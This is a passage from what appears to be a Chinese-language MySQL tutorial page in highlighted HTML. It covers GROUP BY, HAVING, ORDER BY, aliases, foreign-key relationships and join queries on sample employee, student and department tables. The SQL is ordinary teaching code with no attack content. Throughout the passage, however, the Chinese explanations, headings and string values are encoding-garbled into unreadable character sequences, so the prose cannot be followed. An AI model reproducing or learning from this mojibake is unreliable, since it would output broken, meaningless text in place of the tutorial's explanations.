<span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;wang&#x27;</span>,<span class="number">3000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;chen&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">&#x27;yukt&#x27;</span>,<span class="number">7000</span>,<span class="number">1002</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">7</span>,<span class="string">&#x27;rett&#x27;</span>,<span class="number">6000</span>,<span class="number">1003</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">8</span>,<span class="string">&#x27;mujk&#x27;</span>,<span class="number">4000</span>,<span class="number">1004</span>); </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">9</span>,<span class="string">&#x27;poik&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>GROUP BYå’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨</p>
</li>
</ol>
<p>ç»Ÿè®¡å„éƒ¨é—¨å‘˜å·¥ä¸ªæ•° MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<p>ç»Ÿè®¡éƒ¨é—¨ç¼–å·å¤§äº1001çš„å„éƒ¨é—¨å‘˜å·¥ä¸ªæ•° MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">where</span> departmentnumber&gt;<span class="number">1001</span> <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>GROUP BYå’Œèšåˆå‡½æ•°HAVINGä¸€èµ·ä½¿ç”¨</p>
</li>
</ol>
<p>ç»Ÿè®¡å·¥èµ„æ€»å’Œå¤§äº8000çš„éƒ¨é—¨ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary),departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber <span class="keyword">having</span> <span class="built_in">sum</span>(salary)&gt;<span class="number">8000</span>;</span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨ORDER-BYå¯¹æŸ¥è¯¢ç»“æœæ’åº">ä½¿ç”¨ORDER BYå¯¹æŸ¥è¯¢ç»“æœæ’åº</h3>
<p>ä»è¡¨ä¸­æŸ»è¯¢å‡ºæ¥çš„æ•°æ®å¯èƒ½æ˜¯æ— åºçš„æˆ–è€…å…¶æ’åˆ—é¡ºåºä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ORDER BYå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å­—æ®µå<span class="number">1</span>,å­—æ®µå<span class="number">2</span>,â€¦</span><br><span class="line"><span class="keyword">FROM</span> è¡¨å</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> å­—æ®µå<span class="number">1</span> [<span class="keyword">ASC</span> ä¸¨ <span class="keyword">DESC</span>],å­—æ®µå<span class="number">2</span> [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure>
<p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šå­—æ®µå1ã€å­—æ®µå2æ˜¯æŸ¥è¯¢ç»“æœæ’åºçš„ä¾æ®ï¼›å‚æ•° ASCè¡¨ç¤ºæŒ‰ç…§å‡åºæ’åºï¼ŒDESCè¡¨ç¤ºæŒ‰ç…§é™åºæ’åºï¼›é»˜è®¤æƒ…å†µä¸‹ï¼ŒæŒ‰ç…§ASCæ–¹å¼æ’åºã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒORDER BYå­å¥ä½äºæ•´ä¸ªSELECTè¯­å¥çš„æœ«å°¾ã€‚</p>
<p>æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿå¹¶æŒ‰ç…§å¹´çºªå¤§å°å‡åºæ’åˆ— MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿå¹¶æŒ‰ç…§å¹´çºªå¤§å°é™åºæ’åˆ— MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>
<h2 id="åˆ«åè®¾ç½®">åˆ«åè®¾ç½®</h2>
<p>åœ¨æŸ»è¯¢æ•°æ®æ—¶å¯ä¸ºè¡¨å’Œå­—æ®µå–åˆ¥åï¼Œè¯¥åˆ«åä»£æ›¿è¡¨å’Œå­—æ®µçš„åŸåå‚ä¸æŸ¥è¯¢æ“ä½œã€‚</p>
<ol>
<li class="lvl-3">
<p>ä¸ºè¡¨å–å</p>
</li>
</ol>
<p>åœ¨æŸ¥è¯¢æ“ä½œæ—¶ï¼Œå‡è‹¥è¡¨åå¾ˆé•¿ä½¿ç”¨èµ·æ¥å°±ä¸å¤ªæ–¹ä¾¿ï¼Œæ­¤æ—¶å¯ä¸ºè¡¨å–ä¸€ä¸ªåˆ¥åï¼Œç”¨è¯¥åˆ«åæ¥ä»£æ›¿è¡¨çš„åç§°ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> è¡¨å [<span class="keyword">AS</span>] è¡¨çš„åˆ«å <span class="keyword">WHERE</span> .... ;</span><br></pre></td></tr></table></figure>
<p>å°†studentæ”¹ä¸ºstuæŸ¥è¯¢æ•´è¡¨ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">as</span> stu;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>ä¸ºå­—æ®µå–å</p>
</li>
</ol>
<p>åœ¨æŸ¥è¯¢æ“ä½œæ—¶ï¼Œå‡è‹¥å­—æ®µåå¾ˆé•¿ä½¿ç”¨èµ·æ¥å°±ä¸å¤ªæ–¹ä¾¿ï¼Œæ­¤æ—¶å¯è¯¥å­—æ®µå–ä¸€ä¸ªåˆ¥åï¼Œç”¨è¯¥åˆ«åæ¥ä»£æ›¿å­—æ®µçš„åç§°ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å­—æ®µå<span class="number">1</span> [<span class="keyword">AS</span>] åˆ«å<span class="number">1</span> , å­—æ®µå<span class="number">2</span> [<span class="keyword">AS</span>] åˆ«å<span class="number">2</span> , ... <span class="keyword">FROM</span> è¡¨å <span class="keyword">WHERE</span> ... ;</span><br></pre></td></tr></table></figure>
<p>å°†studentä¸­çš„nameå–åˆ«åä¸ºâ€œå§“åâ€ æŸ¥è¯¢æ•´è¡¨ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">as</span> <span class="string">&#x27;å§“å&#x27;</span>,id <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="è¡¨çš„å…³è”å…³ç³»">è¡¨çš„å…³è”å…³ç³»</h2>
<p>åœ¨å®é™…å¼€å‘ä¸­æ•°æ®è¡¨ä¹‹é—´å­˜åœ¨ç€å„ç§å…³è”å…³ç³»ã€‚åœ¨æ­¤ï¼Œä»‹ç»MySQLä¸­æ•°æ®è¡¨çš„ä¸‰ç§å…³è”å…³ç³»ã€‚å¤šå¯¹ä¸€å¤šå¯¹ä¸€(äº¦ç§°ä¸ºä¸€å¯¹å¤š)æ˜¯æ•°æ®è¡¨ä¸­æœ€å¸¸è§çš„ä¸€ç§å…³ç³»ã€‚ä¾‹å¦‚ï¼šå‘˜å·¥ä¸éƒ¨é—¨ä¹‹é—´çš„å…³ç³»ï¼Œä¸€ä¸ªéƒ¨é—¨å¯ä»¥æœ‰å¤šä¸ªå‘˜å·¥ï¼›è€Œä¸€ä¸ªå‘˜å·¥ä¸èƒ½å±äºå¤šä¸ªéƒ¨é—¨åªå±äºæŸä¸ªéƒ¨é—¨ã€‚åœ¨å¤šå¯¹ä¸€çš„è¡¨å…³ç³» ä¸­ï¼Œåº”å°†å¤–é”®å»ºåœ¨å¤šçš„ä¸€æ–¹å¦åˆ™ä¼šé€ æˆæ•°æ®çš„å†—ä½™ã€‚å¤šå¯¹å¤šå¤šå¯¹å¤šæ˜¯æ•°æ®è¡¨ä¸­å¸¸è§çš„ä¸€ç§å…³ç³»ã€‚ä¾‹å¦‚ï¼šå­¦ç”Ÿä¸è€å¸ˆä¹‹é—´çš„å…³ç³»ï¼Œä¸€ä¸ªå­¦ç”Ÿå¯ä»¥æœ‰å¤šä¸ªè€å¸ˆè€Œä¸”ä¸€ä¸ªè€å¸ˆæœ‰å¤šä¸ªå­¦ç”Ÿã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†å®ç°è¿™ç§å…³ç³»éœ€è¦å®šä¹‰ä¸€å¼ ä¸­é—´è¡¨(äº¦ç§°ä¸ºè¿æ¥è¡¨)è¯¥è¡¨ä¼šå­˜åœ¨ä¸¤ä¸ªå¤–é”®åˆ†åˆ«å‚ç…§è€å¸ˆè¡¨å’Œå­¦ç”Ÿè¡¨ã€‚ä¸€å¯¹ä¸€åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸€å¯¹ä¸€çš„å…³è”å…³ç³»åœ¨æ•°æ®åº“ä¸­å¹¶ä¸å¸¸è§ï¼›å› ä¸ºä»¥è¿™ç§æ–¹å¼å­˜å‚¨çš„ä¿¡æ¯é€šå¸¸ä¼šæ”¾åœ¨åŒä¸€å¼ è¡¨ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥å­¦ä¹ åœ¨ä¸€å¯¹å¤šçš„å…³è”å…³ç³»ä¸­å¦‚æœæ·»åŠ å’Œåˆ é™¤æ•°æ®ã€‚å…ˆå‡†å¤‡ä¸€äº›æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºç­çº§è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">    cid <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    cname <span class="type">varchar</span>(<span class="number">30</span>) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå­¦ç”Ÿè¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student(</span><br><span class="line">    sid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    sname <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">    classid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ä¸ºå­¦ç”Ÿè¡¨æ·»åŠ å¤–é”®çº¦æŸ</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_student_classid <span class="keyword">FOREIGN KEY</span>(classid) <span class="keyword">REFERENCES</span> <span class="keyword">class</span>(cid);</span><br><span class="line"><span class="comment">-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;lili&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;domi&#x27;</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>å…³è”æŸ¥è¯¢</p>
</li>
</ol>
<p>æŸ¥è¯¢Javaç­çš„æ‰€æœ‰å­¦ç”Ÿ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> classid=(<span class="keyword">select</span> cid <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cname=<span class="string">&#x27;Java&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>å…³äºå…³è”å…³ç³»çš„æ•°æ®åˆ é™¤</p>
</li>
</ol>
<p>è¯·ä»ç­çº§è¡¨ä¸­åˆ é™¤Javaç­çº§ã€‚åœ¨æ­¤ï¼Œè¯·æ³¨æ„ï¼šç­çº§è¡¨å’Œå­¦ç”Ÿè¡¨ä¹‹é—´å­˜åœ¨å…³è”å…³ç³»ï¼›è¦åˆ é™¤Javaç­çº§ï¼Œåº”è¯¥å…ˆåˆ é™¤å­¦ç”Ÿè¡¨ä¸­ä¸è¯¥ç­ç›¸å…³è”çš„å­¦ç”Ÿã€‚å¦åˆ™ï¼Œå‡è‹¥å…ˆåˆ é™¤Javaç­é‚£ä¹ˆå­¦ç”Ÿè¡¨ä¸­çš„cidå°±å¤±å»äº†å…³è”</p>
<p>åˆ é™¤Javaç­ MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> from student where classid=(<span class="keyword">select</span> cid from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;)</span>;</span><br><span class="line"><span class="keyword">delete</span> from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="å¤šè¡¨è¿æ¥æŸ¥è¯¢">å¤šè¡¨è¿æ¥æŸ¥è¯¢</h2>
<h3 id="äº¤å‰è¿æ¥æŸ¥è¯¢">äº¤å‰è¿æ¥æŸ¥è¯¢</h3>
<p>äº¤å‰è¿æ¥è¿”å›çš„ç»“æœæ˜¯è¢«è¿æ¥çš„ä¸¤ä¸ªè¡¨ä¸­æ‰€æœ‰æ•°æ®è¡Œçš„ç¬›å¡å„¿ç§¯ï¼›æ¯”å¦‚ï¼šé›†åˆA={a,b}ï¼Œé›†åˆB={0,1,2}ï¼Œåˆ™é›†åˆAå’ŒBçš„ç¬›å¡å°”ç§¯ä¸º{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}ã€‚æ‰€ä»¥ï¼Œäº¤å‰è¿æ¥ä¹Ÿè¢«ç§°ä¸ºç¬›å¡å°”è¿æ¥ï¼Œå…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> è¡¨<span class="number">1</span> <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> è¡¨<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨ï¼šåœ¨è¯¥è¯­æ³•ä¸­ï¼ŒCROSS JOINç”¨äºè¿æ¥ä¸¤ä¸ªè¦æŸ¥è¯¢çš„è¡¨ï¼Œé€šè¿‡è¯¥è¯­å¥å¯ä»¥æŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­æ‰€æœ‰çš„æ•°æ®ç»„åˆã€‚</font></p>
<p><strong>ç”±äºè¿™ä¸ªäº¤å‰è¿æ¥æŸ¥è¯¢åœ¨å®é™…è¿ç”¨ä¸­æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œæ‰€ä»¥åªåšä¸ºäº†è§£å³å¯</strong></p>
<h3 id="å†…é“¾æ¥æŸ¥è¯¢">å†…é“¾æ¥æŸ¥è¯¢</h3>
<p>å†…è¿æ¥(Inner Join)åˆç§°ç®€å•è¿æ¥æˆ–è‡ªç„¶è¿æ¥ï¼Œæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„è¿æ¥æŸ¥è¯¢ã€‚å†…è¿æ¥ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦å¯¹ä¸¤ä¸ªè¡¨ä¸­çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒå¹¶åˆ—å‡ºä¸è¿æ¥æ¡ä»¶åŒ¹é…çš„æ•°æ®è¡Œï¼Œç»„åˆæˆæ–°çš„ è®°å½•ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å†…è¿æ¥æŸ¥è¯¢ä¸­åªæœ‰æ»¡è¶³æ¡ä»¶çš„è®°å½•æ‰èƒ½å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> æŸ¥è¯¢å­—æ®µ<span class="number">1</span>,æŸ¥è¯¢å­—æ®µ<span class="number">2</span>, ... <span class="keyword">FROM</span> è¡¨<span class="number">1</span> [<span class="keyword">INNER</span>] <span class="keyword">JOIN</span> è¡¨<span class="number">2</span> <span class="keyword">ON</span> è¡¨<span class="number">1.</span>å…³ç³»å­—æ®µ=è¡¨<span class="number">2.</span>å…³ç³»å­—æ®µ</span><br></pre></td></tr></table></figure>
<p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šINNER JOINç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨ï¼ŒONæ¥æŒ‡å®šè¿æ¥æ¡ä»¶ï¼›å…¶ä¸­INNERå¯ä»¥çœç•¥ã€‚</p>
<p>å‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- è‹¥å­˜åœ¨æ•°æ®åº“mydbåˆ™åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- é€‰æ‹©æ•°æ®åº“mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºéƒ¨é—¨è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> department(</span><br><span class="line">  did <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  dname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå‘˜å·¥è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">  eid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  ename <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  eage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  departmentid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘éƒ¨é—¨è¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;è´¢åŠ¡éƒ¨&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;æŠ€æœ¯éƒ¨&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;è¡Œæ”¿éƒ¨&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;ç”Ÿæ´»éƒ¨&#x27;</span>);</span><br><span class="line"><span class="comment">-- å‘å‘˜å·¥è¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;å¼ ä¸‰&#x27;</span>,<span class="number">19</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;æå››&#x27;</span>,<span class="number">18</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;ç‹äº”&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;èµµå…­&#x27;</span>,<span class="number">20</span>,<span class="number">1004</span>);</span><br></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å‘˜å·¥å§“ååŠå…¶æ‰€å±éƒ¨é—¨åç§° MySQLå‘½ä»¤ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> employee.ename,department.dname <span class="keyword">from</span> department <span class="keyword">inner</span> <span class="keyword">join</span> employee <span class="keyword">on</span> department.did=employee.departmentid;</span><br></pre></td></tr></table></figure>
<h3 id="å¤–è¿æ¥æŸ¥è¯¢">å¤–è¿æ¥æŸ¥è¯¢</h3>
<p>åœ¨ä½¿ç”¨å†…è¿æ¥æŸ¥è¯¢æ—¶æˆ‘ä»¬å‘ç°ï¼šè¿”å›çš„ç»“æœåªåŒ…å«ç¬¦åˆæŸ¥è¯¢æ¡ä»¶å’Œè¿æ¥æ¡ä»¶çš„æ•°æ®ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶è¿˜éœ€è¦åœ¨è¿”å›æŸ¥è¯¢ç»“æœä¸­ä¸ä»…åŒ…å«ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼Œè€Œä¸”è¿˜åŒ…æ‹¬å·¦è¡¨ã€å³è¡¨æˆ–ä¸¤ä¸ªè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨å¤–è¿æ¥æŸ¥è¯¢ã€‚å¤–è¿æ¥åˆåˆ†ä¸ºå·¦(å¤–)è¿æ¥å’Œå³(å¤–)è¿æ¥ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> æŸ¥è¯¢å­—æ®µ<span class="number">1</span>,æŸ¥è¯¢å­—æ®µ<span class="number">2</span>, ... <span class="keyword">FROM</span> è¡¨<span class="number">1</span> <span class="keyword">LEFT</span> | <span class="keyword">RIGHT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> è¡¨<span class="number">2</span> <span class="keyword">ON</span> è¡¨<span class="number">1.</span>å…³ç³»å­—æ®µ=è¡¨<span class="number">2.</span>å…³ç³»å­—æ®µ <span class="keyword">WHERE</span> æ¡ä»¶</span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤å¯è§ï¼Œå¤–è¿æ¥çš„è¯­æ³•æ ¼å¼å’Œå†…è¿æ¥éå¸¸ç›¸ä¼¼ï¼Œåªä¸è¿‡ä½¿ç”¨çš„æ˜¯LEFT [OUTER] JOINã€RIGHT [OUTER] JOINå…³é”®å­—ã€‚å…¶ä¸­ï¼Œå…³é”®å­—å·¦è¾¹çš„è¡¨è¢«ç§°ä¸ºå·¦è¡¨ï¼Œå…³é”®å­—å³è¾¹çš„è¡¨è¢«ç§°ä¸ºå³è¡¨ï¼›OUTERå¯ä»¥çœç•¥ã€‚</p>
<p>åœ¨ä½¿ç”¨å·¦(å¤–)è¿æ¥å’Œå³(å¤–)è¿æ¥æŸ¥è¯¢æ—¶ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯ä¸ä¸€è‡´çš„ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<p><strong>1ã€LEFT [OUTER] JOIN å·¦(å¤–)è¿æ¥ï¼šè¿”å›åŒ…æ‹¬å·¦è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå³è¡¨ä¸­ç¬¦åˆè¿æ¥æ¡ä»¶çš„è®°å½•ã€‚<br>
2ã€RIGHT [OUTER] JOIN å³(å¤–)è¿æ¥ï¼šè¿”å›åŒ…æ‹¬å³è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå·¦è¡¨ä¸­ç¬¦åˆè¿æ¥æ¡ä»¶çš„è®°å½•ã€‚</strong></p>
<p>å…ˆå‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- è‹¥å­˜åœ¨æ•°æ®åº“mydbåˆ™åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- é€‰æ‹©æ•°æ®åº“mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºç­çº§è¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span 